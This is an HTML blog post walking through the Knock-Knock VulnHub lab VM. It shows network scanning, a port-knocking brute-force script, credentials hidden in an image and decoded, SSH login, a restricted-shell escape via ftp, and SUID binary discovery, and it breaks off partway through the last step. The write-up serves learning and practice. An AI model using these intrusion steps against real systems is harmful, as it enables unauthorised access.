@@ -1,0 +1,1272 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Knock-Knock VM Walkthrough - Knapsy&#8217;s brain dump</title>
+  <meta name="author" content="Knapsy">
+
+  
+  <meta name="description" content="Just after awesome weekend hacking away at Ruxcon, VulnHub delivered yet another boot2root VM - wow, that&rsquo;s been busy (and fun) last couple of &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://blog.knapsy.com/blog/2014/10/16/knock-knock-vm-walkthrough">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Knapsy's brain dump" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-55363999-1']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Knapsy&#8217;s brain dump</a></h1>
+  
+    <h2>IT security and other /dev/random stuff.</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:blog.knapsy.com" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Knock-Knock VM Walkthrough</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-10-16T15:29:15+11:00'><span class='date'><span class='date-month'>Oct</span> <span class='date-day'>16</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>3:29 pm</span></time>
+        
+           | <a href="#disqus_thread"
+             data-disqus-identifier="http://blog.knapsy.com">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>Just after awesome weekend hacking away at <a href="http://ruxcon.org.au">Ruxcon</a>, <a href="http://vulnhub.com">VulnHub</a> delivered yet another boot2root VM - wow, that&rsquo;s been busy (and fun) last couple of weeks! Good practice for another big CTF that is coming up for me very soon&hellip;</p>
+
+<p>Anyway, without too much of an intro, let&rsquo;s get to it!</p>
+
+<!-- more -->
+
+
+<h2>Recon</h2>
+
+<p>So, as always, start up the pwn-able VM, Kali and get to work.</p>
+
+<p>First, use <code>netdiscover</code> to find out IP address of our victim.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# netdiscover -r 172.16.246.129/24
+</span><span class='line'>
+</span><span class='line'> Currently scanning: 172.16.246.0/24   |   Screen View: Unique Hosts           
+</span><span class='line'>                                                                               
+</span><span class='line'> 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180               
+</span><span class='line'> _____________________________________________________________________________
+</span><span class='line'>   IP            At MAC Address      Count  Len   MAC Vendor                   
+</span><span class='line'> ----------------------------------------------------------------------------- 
+</span><span class='line'> 172.16.246.1    00:50:56:c0:00:01    01    060   VMWare, Inc.                 
+</span><span class='line'> 172.16.246.133  00:0c:29:5c:26:15    01    060   VMware, Inc.                 
+</span><span class='line'> 172.16.246.254  00:50:56:e9:b1:8a    01    060   VMWare, Inc.                 </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Next, <code>nmap</code> to see what services do we see (standard procedure, really).</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nmap -sV 172.16.246.133
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2014-10-16 15:40 EST
+</span><span class='line'>Nmap scan report for 172.16.246.133
+</span><span class='line'>Host is up (0.00038s latency).
+</span><span class='line'>All 1000 scanned ports on 172.16.246.133 are filtered
+</span><span class='line'>MAC Address: 00:0C:29:5C:26:15 (VMware)
+</span><span class='line'>
+</span><span class='line'>Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 18.31 seconds</span></code></pre></td></tr></table></div></figure>
+
+
+<p>What&hellip; can&rsquo;t see anything?! But we can ping it right?</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# ping 172.16.246.133
+</span><span class='line'>PING 172.16.246.133 (172.16.246.133) 56(84) bytes of data.
+</span><span class='line'>From 172.16.246.133 icmp_seq=1 Destination Port Unreachable
+</span><span class='line'>From 172.16.246.133 icmp_seq=2 Destination Port Unreachable
+</span><span class='line'>From 172.16.246.133 icmp_seq=3 Destination Port Unreachable
+</span><span class='line'>^C
+</span><span class='line'>--- 172.16.246.133 ping statistics ---
+</span><span class='line'>3 packets transmitted, 0 received, +3 errors, 100% packet loss, time 1999ms</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Ok, I admit, at this point I thought something went wrong with VM&rsquo;s network adapter, however, as <a href="https://twitter/zer0w1re">zer0w1re</a> pointed out, there&rsquo;s is a difference between &ldquo;Host Unreachable&rdquo; and &ldquo;Port Unreachable&rdquo;&hellip; ahhhh, of course! I skimmed through the output too quickly - first lesson learnt, carefully read what&rsquo;s displayed back on the screen! Duh!</p>
+
+<h2>Port knocking</h2>
+
+<p>Anyway, looks like everything is being blocked by a host firewall and all ports are closed. Also, the name of the VM suggests that we are most likely dealing with a &ldquo;port knocking&rdquo; mechanism, which is kind of security by obscurity, implementing an idea of knocking on the door following a specific pattern to make the door open. Since we&rsquo;re dealing with a server here, we&rsquo;ll need to know a proper sequence of ports to knock for the firewall rules to be loosened for our IP address.</p>
+
+<p>Ok, but how do we find the actual port sequence? There&rsquo;s no real way of bypassing port knocking, you really need to know the right sequence. Brute forcing is simply not viable - too many ports and too many possible variations.</p>
+
+<p>Let&rsquo;s have a look at the <code>nmap</code> output again&hellip; we only scanned default, low ports (&ldquo;All 1000 scanned ports on 172.16.246.133 are filtered&rdquo;), let&rsquo;s scan beyond that!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nmap -sV -p 0-5000 172.16.246.133
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2014-10-16 15:50 EST
+</span><span class='line'>Nmap scan report for 172.16.246.133
+</span><span class='line'>Host is up (0.00039s latency).
+</span><span class='line'>Not shown: 5000 filtered ports
+</span><span class='line'>PORT     STATE SERVICE VERSION
+</span><span class='line'>1337/tcp open  waste?
+</span><span class='line'>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
+</span><span class='line'>SF-Port1337-TCP:V=6.47%I=7%D=10/16%Time=543F4EB8%P=i686-pc-linux-gnu%r(NUL
+</span><span class='line'>SF:L,15,"\[6129,\x2023888,\x2012152\]\n");
+</span><span class='line'>MAC Address: 00:0C:29:5C:26:15 (VMware)
+</span><span class='line'>
+</span><span class='line'>Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 55.08 seconds</span></code></pre></td></tr></table></div></figure>
+
+
+<p>That&rsquo;s better! We can see port 1337 listening! And it gives an interesting output:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nc 172.16.246.133 1337
+</span><span class='line'>[32510, 55533, 4648]</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Alright, looks like a sequence of ports we need to knock on - let&rsquo;s go ahead and try to knock. We have few options here, we can either use single commands to knock on those ports (<code>ping</code>, <code>nc</code>, <code>hping3</code>), write a simple script to do it for us in sequence, or use predefined program that will do it for us, e.g. <code>knock</code> - a port knocking client, coming as a part of a knockd server.</p>
+
+<p>And that&rsquo;s where it becomes weird. I tried number of different approaches with varying results. Generally what I was doing was:</p>
+
+<ol>
+<li>nc 172.16.246.133 1337</li>
+<li>knock on ports</li>
+<li>nmap -sV 172.16.246.133</li>
+</ol>
+
+
+<p>I tried knocking with <code>nmap</code>, <code>nc</code>, <code>ping</code>, wrote a script knocking with <code>hping3</code>, nothing seemed to be working! And then, a simple chained command worked:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# hping3 -S 172.16.246.133 -p 680 -c 1; hping3 -S 172.16.246.133 -p 39372 -c 1; hping3 -S 172.16.246.133 -p 46484 -c 1</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nmap -sV 172.16.246.133
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2014-10-16 16:21 EST
+</span><span class='line'>Nmap scan report for 172.16.246.133
+</span><span class='line'>Host is up (0.00028s latency).
+</span><span class='line'>Not shown: 998 filtered ports
+</span><span class='line'>PORT   STATE SERVICE VERSION
+</span><span class='line'>22/tcp open  ssh     OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
+</span><span class='line'>80/tcp open  http    nginx 1.2.1
+</span><span class='line'>MAC Address: 00:0C:29:5C:26:15 (VMware)
+</span><span class='line'>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span><span class='line'>
+</span><span class='line'>Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 24.21 seconds</span></code></pre></td></tr></table></div></figure>
+
+
+<p>That got me thinking, why all of a sudden one command worked while all others didn&rsquo;t. Maybe the order of ports provided is not neccessarily left-to-right, but is randomised? I wrote a simple bash script trying all possible combinations to test it out.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">#!/bin/bash</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">if</span> <span class="o">[</span> <span class="nv">$# </span>-ne <span class="m">4</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+</span><span class='line'>  <span class="nb">echo</span> <span class="s2">&quot;Usage: $0 ip port1 port2 port3&quot;</span>
+</span><span class='line'>  <span class="nb">exit</span><span class="p">;</span>
+</span><span class='line'><span class="k">fi</span>
+</span><span class='line'>
+</span><span class='line'><span class="nv">HOST</span><span class="o">=</span><span class="nv">$1</span>
+</span><span class='line'><span class="nb">shift</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># Go through all possible combinations of 3 ports</span>
+</span><span class='line'><span class="k">for</span> PORT_1 in <span class="s2">&quot;$@&quot;</span>
+</span><span class='line'><span class="k">do</span>
+</span><span class='line'>  <span class="k">for</span> PORT_2 in <span class="s2">&quot;$@&quot;</span>
+</span><span class='line'>  <span class="k">do</span>
+</span><span class='line'>          <span class="k">for</span> PORT_3 in <span class="s2">&quot;$@&quot;</span>
+</span><span class='line'>          <span class="k">do</span>
+</span><span class='line'>              hping3 -S <span class="nv">$HOST</span> -p <span class="nv">$PORT_1</span> -c <span class="m">1</span> &gt;<span class="p">&amp;</span><span class="m">2</span> &gt; /dev/null
+</span><span class='line'>              hping3 -S <span class="nv">$HOST</span> -p <span class="nv">$PORT_2</span> -c <span class="m">1</span> &gt;<span class="p">&amp;</span><span class="m">2</span> &gt; /dev/null
+</span><span class='line'>              hping3 -S <span class="nv">$HOST</span> -p <span class="nv">$PORT_3</span> -c <span class="m">1</span> &gt;<span class="p">&amp;</span><span class="m">2</span> &gt; /dev/null
+</span><span class='line'>          <span class="k">done</span>
+</span><span class='line'>  <span class="k">done</span>
+</span><span class='line'><span class="k">done</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Restarted the Knock-Knock VM and tried again.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nc 172.16.246.133 1337
+</span><span class='line'>[1138, 1248, 56206]
+</span><span class='line'>root@kali:~# ./portknock.sh 172.16.246.133 1138 1248 56206
+</span><span class='line'>--- 172.16.246.133 hping statistic ---
+</span><span class='line'>1 packets transmitted, 0 packets received, 100% packet loss
+</span><span class='line'>round-trip min/avg/max = 0.0/0.0/0.0 ms
+</span><span class='line'>
+</span><span class='line'>--- 172.16.246.133 hping statistic ---
+</span><span class='line'>1 packets transmitted, 1 packets received, 0% packet loss
+</span><span class='line'>round-trip min/avg/max = 0.0/0.0/0.0 ms
+</span><span class='line'>
+</span><span class='line'>--- 172.16.246.133 hping statistic ---
+</span><span class='line'>1 packets transmitted, 0 packets received, 100% packet loss
+</span><span class='line'>round-trip min/avg/max = 0.0/0.0/0.0 ms
+</span><span class='line'>
+</span><span class='line'>...truncated...
+</span><span class='line'>
+</span><span class='line'>root@kali:~# nmap -sV 172.16.246.133
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2014-10-16 19:33 EST
+</span><span class='line'>Nmap scan report for 172.16.246.133
+</span><span class='line'>Host is up (0.00030s latency).
+</span><span class='line'>Not shown: 998 filtered ports
+</span><span class='line'>PORT   STATE SERVICE VERSION
+</span><span class='line'>22/tcp open  ssh     OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
+</span><span class='line'>80/tcp open  http    nginx 1.2.1
+</span><span class='line'>MAC Address: 00:0C:29:5C:26:15 (VMware)
+</span><span class='line'>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span><span class='line'>
+</span><span class='line'>Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 24.19 seconds</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Woohoo, so that worked! Lesson #2 learnt - don&rsquo;t assume stuff&hellip; sometimes it helps, but not always pays off!</p>
+
+<h2>Invisible ink and Ceasar(ish) cipher</h2>
+
+<p>Ok, moving on - start up Iceweasel and let&rsquo;s have a look at the site.</p>
+
+<p><img src="/images/posts/2014-10-16-knock-knock-vm-walkthrough/door.png" alt="Door" /></p>
+
+<p>Let&rsquo;s find something we can use to break in. Few things I looked at without any luck:</p>
+
+<ul>
+<li>robots.txt file doesn&rsquo;t exist</li>
+<li>no cookies</li>
+<li><code>dirbuster</code> didn&rsquo;t return anything interesting</li>
+<li>tried to analyse and replay traffic using <code>burpsuite</code>, but also wasn&rsquo;t able to find anything interesting, except some basic cache headers</li>
+</ul>
+
+
+<p>After poking around for ages, I got pretty frustrated, I couldn&rsquo;t find anything that would give me a way in! But after having a chat with <a href="https://twitter.com/recrudesce">recrudesce</a>, I realised that &ldquo;picture is worth a thousand words&rdquo; and decided to look into it closer.</p>
+
+<p>Initially I thought that I&rsquo;ll need to do some fancy stego on it, but first I downloaded the file, ran <code>strings</code> on it and found something very interesting at the bottom of the output.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# strings knockknock.jpg
+</span><span class='line'>
+</span><span class='line'>...truncated...
+</span><span class='line'>
+</span><span class='line'>tR)O
+</span><span class='line'>MO:/?
+</span><span class='line'>qW|U
+</span><span class='line'>\+\U
+</span><span class='line'>Login Credentials
+</span><span class='line'>abfnW
+</span><span class='line'>sax2Cw9Ow</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Cool! We have something. Straight away I tried logging via SSH in with username: abfnW and password: sax2Cw90w, but that didn&rsquo;t work. I tried username: sax2Cw90w and password: abfnW, but that didn&rsquo;t work either.</p>
+
+<p>I started thinking what could it be, obviously it must have been somehow encrypted. Doesn&rsquo;t look like base64, neither like MD5. Let&rsquo;s go back to the ancient times and try a Caesar cipher.</p>
+
+<p>Using this useful resource <a href="http://rumkin.com/tools/cipher/caesar.php">Caesarian Shift</a> I tried going through various different rotations and trying to find something that would like a human readable string. Nothing stood out straight away, but after few more tries and looking at a particularly popular ROT-13, I realised that the username and password were actually backwards!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>abfnW   -   Wnfba
+</span><span class='line'>nosaJ   -   Jason</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Wooho, did the same for password and tried logging in SSH with the following credentials:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>username: Jason
+</span><span class='line'>password: jB9jP2knf</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# ssh Jason@172.16.246.133
+</span><span class='line'>Jason@172.16.246.133's password: 
+</span><span class='line'>Permission denied, please try again.
+</span><span class='line'>Jason@172.16.246.133's password: </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Oops, &ldquo;Jason&rdquo; didn&rsquo;t work, let&rsquo;s try all lower case (more in sync with Unix account naming convention).</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# ssh jason@172.16.246.133
+</span><span class='line'>jason@172.16.246.133's password: 
+</span><span class='line'>Linux knockknock 3.2.0-4-486 #1 Debian 3.2.60-1+deb7u3 i686
+</span><span class='line'>
+</span><span class='line'>The programs included with the Debian GNU/Linux system are free software;
+</span><span class='line'>the exact distribution terms for each program are described in the
+</span><span class='line'>individual files in /usr/share/doc/*/copyright.
+</span><span class='line'>
+</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span><span class='line'>permitted by applicable law.
+</span><span class='line'>You have new mail.
+</span><span class='line'>Last login: Mon Oct 13 15:21:04 2014 from 172.16.246.129
+</span><span class='line'>jason@knockknock:~$ </span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Restricted shell escape</h2>
+
+<p>Ha! We&rsquo;ve got a shell! Let&rsquo;s poke around. We&rsquo;ll quickly discover that we&rsquo;re in a limited shell.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>jason@knockknock:~$ echo $SHELL
+</span><span class='line'>/bin/rbash</span></code></pre></td></tr></table></div></figure>
+
+
+<p>But thanks to <a href="https://knapsy.github.io/blog/2014/10/05/persistence-vm-writeup/">Persistence</a>, I&rsquo;ve learned couple ways of bypassing that, so straight away, I used the same technique as I did in Persistence.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>jason@knockknock:~$ ftp
+</span><span class='line'>ftp&gt; !/bin/bash
+</span><span class='line'>jason@knockknock:~$ echo $SHELL
+</span><span class='line'>/bin/rbash
+</span><span class='line'>jason@knockknock:~$ export SHELL="/bin/bash"
+</span><span class='line'>jason@knockknock:~$ echo $SHELL
+</span><span class='line'>/bin/bash</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Core dump(ster) diving</h2>
+
+<p>Since now we have a normal shell, we can do regular stuff. First thing that stands out is <code>tfc</code> binary with SUID bit set! We may be able to get our root through there.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>jason@knockknock:~$ ls -al
+</span><span class='line'>total 32
+</span><span class='line'>drwxr-xr-x 2 jason jason 4096 Oct 14 12:25 .
+</span><span class='line'>drwxr-xr-x 3 root  root  4096 Sep 24 21:03 ..
+</span><span class='line'>lrwxrwxrwx 1 jason jason    9 Sep 26 09:50 .bash_history -&gt; /dev/null
+</span><span class='line'>-rw-r--r-- 1 jason jason  220 Sep 24 21:03 .bash_logout
+</span><span class='line'>-rw-r--r-- 1 jason jason 3398 Sep 25 21:58 .bashrc
+</span><span class='line'>-rw-r--r-- 1 jason jason  675 Sep 24 21:03 .profile
+</span><span class='line'>-rwsr-xr-x 1 root  jason 7457 Oct 11 18:35 tfc
+</span><span class='line'>-rw------- 1 jason jason 3204 Oct 14 05:31 .viminfo</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Let&rsquo;s see what it is.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>jason@knockknock:~$ strings tfc 
+</span><span class='line'>/lib/ld-linux.so.2
+</span><span class='line'>lWGI
+</span><span class='line'>__gmon_start__
+</span><span class='line'>libc.so.6
+</span><span class='line'>_IO_stdin_used
+</span><span class='line'>strrchr
+</span><span class='line'>puts
+</span><span class='line'>printf
+</span><span class='line'>read
+</span><span class='line'>close
+</span><span class='line'>open
+</span><span class='line'>strcmp
+</span><span class='line'>__libc_start_main
+</span><span class='line'>write
+</span><span class='line'>__xstat
+</span><span class='line'>__lxstat
+</span><span class='line'>GLIBC_2.0
+</span><span class='line'>PTRhp
+</span><span class='line'>QVh$
+</span><span class='line'>[^_]
+</span><span class='line'>  Tiny File Crypter - 1.0
+</span><span class='line'>Usage: ./tfc &lt;filein.tfc&gt; &lt;fileout.tfc&gt;
+</span><span class='line'>&gt;&gt; Filenames need a .tfc extension
+</span><span class='line'>&gt;&gt; No symbolic links!
+</span><span class='line'>&gt;&gt; Failed to open input file
+</span><span class='line'>&gt;&gt; Failed to create the output file
+</span><span class='line'>&gt;&gt; File crypted, goodbye!
+</span><span class='line'>;*2$"
+</span><span class='line'>_______________________________  
+</span><span class='line'>\__    ___/\_   _____/\_   ___ \ 
+</span><span class='line'>  |    |    |    __)  /    \  \/ 
+</span><span class='line'>  |    |    |     \   \     \____
